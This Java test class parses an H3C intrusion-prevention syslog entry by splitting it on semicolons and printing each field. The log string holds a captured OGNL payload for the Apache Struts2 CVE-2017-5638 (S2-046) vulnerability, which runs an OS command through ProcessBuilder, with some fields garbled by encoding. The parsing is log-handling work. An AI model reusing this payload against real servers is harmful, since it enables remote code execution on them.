package src.test;

public class strhaldle {
    public static void main(String[] args){
        String oldstr="<188> Mar 03 04:08:18 2023 H3C %%10 SN:219801A2N89211Q0008N IPS/4/IPS_IPV4_INTERZONE: Protocol(1001)=TCP; Application(1002)=http; SrcIPAddr(1003)=192.168.1.171; SrcPort(1004)=55948; DstIPAddr(1007)=218.22.191.26; DstPort(1008)=80; RcvVPNInstance(1042)=; SrcZoneName(1025)=Trust; DstZoneName(1035)=Untrust; UserName(1113)=192.168.1.171; PolicyName(1079)=ips; AttackName(1088)=CVE-2017-5638 Apache Struts2 S2-046 Ô¶³ÌÃüÁîÖ´ÐÐÂ©¶´; AttackID(1089)=32374; Category(1090)=Â©¶´; Protection(1091)=WebServer; SubProtection(1092)=Apache; Severity(1087)=CRITICAL; Action(1053)=Reset & Logging; CVE(1075)=CVE-2017-5638; BID(1076)=BID-96729; MSB(1077)=--; HitDirection(1115)=original; RealSrcIP(1100)=; SubCategory(1124)=ÃüÁî×¢Èë; LoginUserName(1177)=; LoginPwd(1178)=; CapturePktName(1116)=; HttpHost(1117)=; HttpFirstLine(1118)=; PayLoad(1135)=-----------------------------735323031399963166993862150\\0d\\0aContent-Disposition: form-data; name=\"wdlgwctu\"; filename=\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo mkguufsdterwvnlmohadxzrtgpoeinnabqpexguqatcnjozvrugcsdtrzdoj').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\\00b\"\\0d\\0aContent-Type: text/;";
        String payload="";
        String deletePayload="";

        String newstr[]=oldstr.split(";");
        int newstrLength=newstr.length;
        for(int i=0;i<newstrLength;i++){
            System.out.println(newstr[i]);
        }
    }
}
